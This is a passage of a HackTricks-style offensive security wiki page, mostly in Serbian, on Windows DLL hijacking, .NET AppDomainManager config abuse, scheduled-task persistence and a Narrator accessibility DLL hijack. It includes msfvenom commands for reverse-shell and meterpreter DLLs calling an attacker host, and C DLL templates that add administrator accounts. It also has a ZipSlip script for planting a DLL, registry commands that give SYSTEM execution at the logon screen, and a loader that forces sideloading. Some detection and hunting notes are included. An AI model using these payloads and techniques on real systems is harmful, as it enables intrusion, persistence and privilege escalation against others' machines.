# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking uključuje manipulisanje trusted aplikacijom tako da učita malicious DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, i Side-Loading**. Uglavnom se koristi za code execution, postizanje persistence, i, ređe, privilege escalation. Uprkos fokusu na escalation ovde, metod hijacking-a ostaje isti kroz sve ciljeve.

### Common Techniques

Koristi se nekoliko metoda za DLL hijacking, a efikasnost svake zavisi od strategije učitavanja DLL-ova u aplikaciji:

1. **DLL Replacement**: Zamena originalnog DLL-a malicious-om, opciono uz korišćenje DLL Proxying-a da bi se zadržala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicious DLL-a u search path ispred legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicious DLL-a koji će aplikacija učitati, misleći da je to nepostojeći required DLL.
4. **DLL Redirection**: Izmena search parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi da bi se aplikacija usmerila na malicious DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicious ekvivalentom u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicious DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nije jedini način da se trusted **.NET Framework** proces navede da učita attacker code. Ako je target executable **managed** aplikacija, CLR takođe proverava **application configuration file** nazvan po executable-u (na primer `Setup.exe.config`). Taj fajl može definisati custom **AppDomainManager**. Ako config upućuje na attacker-controlled assembly postavljen pored EXE-a, CLR ga učitava **pre normalne code path aplikacije** i izvršava unutar trusted procesa.

Prema Microsoft-ovoj .NET Framework konfiguracionoj šemi, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se koristio custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. ZavisI od CLR parsiranja konfiguracije, a ne od Win32 DLL search order.
- Host mora zaista biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe`, ili proveri **CLR Runtime Header** u PE metapodacima.
- Naziv config fajla mora tačno da se poklapa sa imenom izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE**.
- Ovo je korisno sa **signed Microsoft/vendor binaries** zato što trusted EXE ostaje netaknut dok malicious managed assembly izvršava in-process.
- Ako već imaš writable installer/update direktorijum, AppDomainManager hijacking može da se koristi kao **prva faza**, a zatim classic DLL sideloading ili reflective loading za kasnije faze.

### AppDomainManager kao downloader + scheduled-task bootstrap

Praktičan intrusion obrazac je da se trusted managed EXE upari i sa malicious `*.config` i sa malicious AppDomainManager DLL-om koji služi samo kao **mali bootstrapper**:

1. User pokreće signed .NET installer ili updater sa uverljive lokacije kao što je `%USERPROFILE%\Downloads`.
2. Pored njega smešten config natera CLR da učita attacker assembly **pre** nego što počne legitiman app logic.
3. Malicious manager izvršava **path gate** (na primer, nastavlja samo ako host EXE radi iz `Downloads`, i dozvoljava drugu fazu samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima pravi payload u user-writable putanju kao što je `%LOCALAPPDATA%\PerfWatson2.exe` i postavlja persistence pomoću scheduled task.

Zašto je ova varijanta važna:
- Signed host EXE ostaje nepromenjen, pa triage koji hash-uje samo glavni binary može da propusti compromise.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL trija na Desktop, Temp ili sandbox putanju može namerno da prekine lanac.
- Prva faza AppDomainManager DLL može da ostane mala i low-noise, dok se pravi implant preuzima kasnije.

Minimalni persistence primer koji se često viđa sa ovim obrascem:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši dostupan** za tog korisnika/sesiju; samo po sebi nije garantovana SYSTEM eskalacija.
- Ova tehnika se često bolje klasifikuje kao **execution/persistence via .NET config abuse** nego kao klasični missing-DLL search-order hijacking, iako napadači često kombinuju obe.

Detection pivoti:
- Potpisani .NET izvršni fajlovi pokrenuti iz **ZIP extraction paths**, `Downloads`, `%TEMP%`, ili drugih foldera koji mogu da se pišu od strane korisnika, sa **colocated** `<exe>.config`.
- Novi scheduled tasks čija akcija pokazuje u `%LOCALAPPDATA%`, `%APPDATA%`, ili `Downloads` i čija imena imitiraju browser/vendor updaters.
- Kratkoživeći managed bootstrap procesi koji odmah preuzmu drugi EXE, a zatim pokrenu `schtasks.exe`.
- Primerci koji izlaze rano osim ako path izvršnog fajla ne odgovara očekivanom user-profile direktorijumu.

### Hijacking an existing scheduled task to relaunch the sideload chain

Za persistence, ne gledajte samo **kreiranje novog taska**. Neke intrusion grupe čekaju da legitimni installer napravi **normal updater task**, a zatim **prepišu task action** tako da postojeće ime, autor i trigger ostanu poznati defenderima.

Reusable workflow:
1. Instalirajte/pokrenite legitimni softver i identifikujte task koji obično kreira.
2. Exportujte task XML i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.
3. Zamenite samo action tako da task pokreće vaš **trusted host EXE** iz staging direktorijuma koji može da piše korisnik, a koji zatim side-load-uje ili AppDomain-load-uje pravi payload.
4. Ponovo registrujte isto ime taska umesto da kreirate novi očigledan persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Ime taska i dalje može da izgleda legitimno (na primer vendor updater).
- **Task Scheduler service** ga pokreće, pa parent/ancestor validacija često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nova imena taskova** mogu da propuste task čija registracija već postoji, ali čija action sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%`, ili neku drugu attacker-controlled putanju.

Brzi hunting pivoti:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite `C:\Windows\System32\Tasks\*` XML i `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata sa baseline-om.
- Alertujte kada **vendor-looking updater task** izvršava iz **user-writable directories** ili pokreće .NET EXE sa lokalno prisutnim `*.config` fajlom.

> [!TIP]
> Za chain korak-po-korak koji kombinuje HTML staging, AES-CTR configs, i .NET implants preko DLL sideloading, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najčešći način da se pronađu missing Dlls unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **uz postavljanje** **sledeća 2 filtera**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

i prikaz samo **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ako tražite **missing dlls uopšteno** pustite ovo da radi još nekoliko **sekundi**.\
Ako tražite **missing dll unutar određenog executable-a** trebalo bi da postavite **još jedan filter kao "Process Name" "contains" `<exec name>`, pokrenete ga, i zaustavite snimanje događaja**.

## Exploiting Missing Dlls

Da bismo podigli privilegije, najbolja šansa je da možemo da **upišemo dll koji će privilegovan proces pokušati da učita** na nekom od **mesta gde će biti tražen**. Zato ćemo moći da **upišemo** dll u **folder** u kome se **dll traži pre** foldera gde je **originalni dll** (čudan slučaj), ili ćemo moći da **upišemo u neki folder gde će dll biti tražen** a originalni **dll ne postoji** ni u jednom folderu.

### Dll Search Order

**Unutar** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dlls specifično učitavaju.**

**Windows applications** traže DLL-ove prateći skup **predefined search paths**, određenim redosledom. Problem DLL hijacking nastaje kada se zlonamerni DLL strateški postavi u jedan od ovih direktorijuma, tako da se učita pre originalnog DLL-a. Rešenje da se ovo spreči je da aplikacija koristi apsolutne putanje kada referencira DLL-ove koji su joj potrebni.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. Direktorijum iz kog je aplikacija učitana.
2. System direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju do ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bit system direktorijum. Ne postoji funkcija koja dobija putanju do ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju do ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi koji su navedeni u PATH environment variable. Imajte u vidu da ovo ne uključuje per-application path definisan preko **App Paths** registry key. **App Paths** key se ne koristi pri računanju DLL search path.

To je **default** redosled pretrage sa uključenim **SafeDllSearchMode**. Kada je isključen, trenutni direktorijum se pomera na drugo mesto. Da biste isključili ovu funkciju, kreirajte registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (default je enabled).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH** pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte u vidu da se **dll može učitati navođenjem apsolutne putanje umesto samo imena**. U tom slučaju će se taj dll **tražiti samo u toj putanji** (ako dll ima dependecies, one će biti tražene kao da su učitane samo po imenu).

Postoje i drugi načini da se izmeni search order, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` završava na `.dll`, `Result` = `NAME NOT FOUND`) da prikupite DLL imena koja proces pokušava da pronađe, ali ne uspeva.
2. Ako binary radi po **schedule/service**, ubacivanje DLL-a sa jednim od tih imena u **application directory** (search-order stavka #1) biće učitano pri sledećem izvršavanju. U jednom .NET scanner slučaju proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravi primerak iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **ZipSlip-style arbitrary write**, napravite ZIP čiji entry izlazi iz extraction dir i tako DLL završi u app folderu:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledani inbox/share; kada planirani task ponovo pokrene proces, on učitava malicious DLL i izvršava vaš kod kao service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novo kreiranog procesa jeste da postavite DllPath polje u RTL_USER_PROCESS_PARAMETERS pri kreiranju procesa pomoću ntdll native API-ja. Ako ovde navedete direktorijum pod kontrolom napadača, target process koji rešava imported DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flags) može biti prinuđen da učita malicious DLL iz tog direktorijuma.

Key idea
- Napravite process parameters sa RtlCreateProcessParametersEx i navedite custom DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces sa RtlCreateUserProcess. Kada target binary rešava DLL po imenu, loader će tokom resolution-a koristiti ovaj prosleđeni DllPath, što omogućava pouzdano sideloading čak i kada malicious DLL nije u istom direktorijumu kao target EXE.

Notes/limitations
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na current process.
- Target mora da importuje ili pozove LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded apsolutne putanje ne mogu da se hijackuju. Forwarded exports i SxS mogu promeniti precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavi maliciozni xmllite.dll (koji exportuje potrebne funkcije ili proxy-uje pravi) u tvoj DllPath direktorijum.
- Pokreni signed binary za koji je poznato da traži xmllite.dll po imenu koristeći gornju tehniku. loader rešava import preko prosleđenog DllPath i sideload-uje tvoj DLL.

Ova tehnika je posmatrana in-the-wild kao deo multi-stage sideloading lanaca: početni launcher drop-uje helper DLL, koji zatim pokreće Microsoft-signed, hijackable binary sa custom DllPath da bi se forsiralo učitavanje attacker-ovog DLL-a iz staging direktorijuma.


### .NET AppDomainManager hijacking via `.exe.config`

Za **.NET Framework** mete, sideloading može da se uradi **pre `Main()`** bez patchovanja memorije zloupotrebom aplikacionog pratećeg **`.exe.config`** fajla. Umesto oslanjanja samo na Win32 DLL search order, attacker postavlja legitiman .NET EXE pored malicioznog config-a i jednog ili više assemblies pod attacker kontrolom.

Kako lanac radi:
1. Host EXE se pokreće i **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`** tako da runtime instancira attacker-controlled `AppDomainManager`.
3. Maliciozni manager dobija izvršavanje **pre `Main()`** unutar trusted host procesa.
4. Isti config može da natera CLR da prvo rešava lokalne assemblies (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može da oslabi runtime validation/telemetry bez inline patchovanja.

Campaign-style obrazac (tačno ugnježđivanje može da varira zavisno od directive / CLR verzije):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava resolution assembly-ja u direktorijumu aplikacije, pretvarajući folder u predvidivu sideloading površinu.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** premeštaju izvršavanje u attacker kod tokom CLR inicijalizacije, pre nego što legitimna logika aplikacije krene da radi.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može da omogući full-trust aplikaciji da učita unsigned ili izmenjene assembly-je bez strong-name validation greške.
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy redirects ka novijim assembly-jima.
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističkijim.
- **`<etwEnable enabled="false"/>`** je posebno zanimljivo jer **CLR sam sebi isključuje ETW vidljivost** iz konfiguracije, umesto da implant patchuje `EtwEventWrite` u memoriji.

Operativni pattern viđen u nedavnim kampanjama:
- Faza 1 postavlja `setup.exe`, `setup.exe.config`, i local assemblies.
- Faza 2 kopira ih u uverljiv **AppData update** folder, preimenuje host u nešto kao `update.exe`, i pokreće ga ponovo preko **scheduled task**.
- Faza 3 proverava execution context (na primer očekivani parent `svchost.exe` iz Task Scheduler-a) pre učitavanja finalnog RAT DLL/export.

Ideje za hunting:
- Potpisani ili inače legitimni **.NET executables** koji se pokreću sa sumnjivim susednim **`.config`** fajlovima u lokacijama koje može da piše korisnik.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binarije iz **`%LOCALAPPDATA%`** ili iz aplikacijski-specifičnih `\bin\update\` direktorijuma.
- Parent/child lanci gde scheduled task pokreće trusted .NET host koji odmah učitava assemblies koji nisu od vendora iz sopstvenog direktorijuma.

#### Exceptions on dll search order from Windows docs

Određeni izuzeci od standardnog DLL search order-a navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji deli ime sa već učitanim u memoriji**, sistem preskače uobičajenu pretragu. Umesto toga, prvo proverava redirection i manifest, pa tek onda prelazi na DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL-om**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu Windows verziju, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim dependent DLL-ovima, **bez pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima dependencies**, pretraga za tim dependent DLL-ovima se obavlja kao da su navedeni samo preko svojih **module names**, bez obzira na to da li je početni DLL identifikovan preko pune putanje.

### Escalating Privileges

**Requirements**:

- Identifikuj proces koji radi ili će raditi pod **different privileges** (horizontal or lateral movement), a kojem **nedostaje DLL**.
- Osiguraj da postoji **write access** za bilo koji **directory** u kome će se **DLL** **tražiti**. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, uslovi su komplikovani za pronalaženje jer je **by default prilično čudno naći privileged executable kojem nedostaje dll**, a još je **čudnije imati write permissions na folderu u system path-u** (to ne možeš by default). Ali, u loše konfigurisanim okruženjima ovo je moguće.\
Ako imaš sreće i ispuniš uslove, možeš da pogledaš [UACME](https://github.com/hfiref0x/UACME) projekat. Iako je **glavni cilj projekta bypass UAC**, tamo možeš naći **PoC** za Dll hijaking za Windows verziju koji možeš da iskoristiš (verovatno samo menjajući putanju foldera u kome imaš write permissions).

Primeti da možeš da **proveriš svoje permissions u folderu** tako što radiš:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih foldera unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports dll-a sa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič o tome kako da **abuse Dll Hijacking to escalate privileges** uz dozvole za upis u **System Path folder** pogledaj:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)će proveriti da li imaš write permissions na bilo kom folderu unutar system PATH.\
Drugi zanimljivi automated tools za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

Ako pronađeš exploitable scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje bila bi da **create a dll that exports at least all the functions the executable will import from it**. U svakom slučaju, imaj na umu da Dll Hijacking dobro dođe da [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili od[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možeš pronaći primer **how to create a valid dll** u ovoj studiji o dll hijacking, fokusiranoj na dll hijacking za execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Takođe, u **next section** možeš pronaći neke **basic dll codes** koji mogu biti korisni kao **templates** ili za kreiranje **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **execute your malicious code when loaded** ali i da **expose** i **work** kao što se **expected** tako što prosleđuje sve pozive pravoj biblioteci.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) zapravo možeš da **indicate an executable and select the library** koju želiš da proxify i da **generate a proxified dll** ili da **indicate the Dll** i **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobij meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tvoja sopstvena

Imaj na umu da u nekoliko slučajeva Dll koji kompajliraš mora da **exportuje više funkcija** koje će učitati proces žrtve, ako te funkcije ne postoje, **binary neće moći da ih učita** i **exploit će fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS localization DLL hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljiv, jezički specifičan localization DLL koji može da se hijackuje za arbitrary code execution i persistence.

Ključne činjenice
- Probe path (trenutni buildovi): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (stariji buildovi): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako postoji writable DLL pod kontrolom napadača na OneCore path-u, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokreni Narrator i posmatraj pokušaj učitavanja gore navedenog path-a.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivan hijack će govoriti/istaknuti UI. Da bi ostao nečujan, pri attach-u enumeriši Narrator thread-ove, otvori glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` ga; nastavi u sopstvenom thread-u. Pogledaj PoC za kompletan kod.

Trigger i persistence preko Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa gore navedenim, pokretanje Narrator učitava planted DLL. Na secure desktop-u (logon screen), pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvoli classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na host, na logon screen-u pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP sesija zatvori—inject/migrate promptno.

Bring Your Own Accessibility (BYOA)
- Možeš da kloniraš ugrađeni Accessibility Tool (AT) registry unos (npr. CursorIndicator), izmeniš ga da pokazuje na proizvoljni binary/DLL, importuješ ga, a zatim postaviš `configuration` na to AT ime. Ovo proxy-uje proizvoljno izvršavanje kroz Accessibility framework.

Napomene
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Sva payload logika može da bude u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

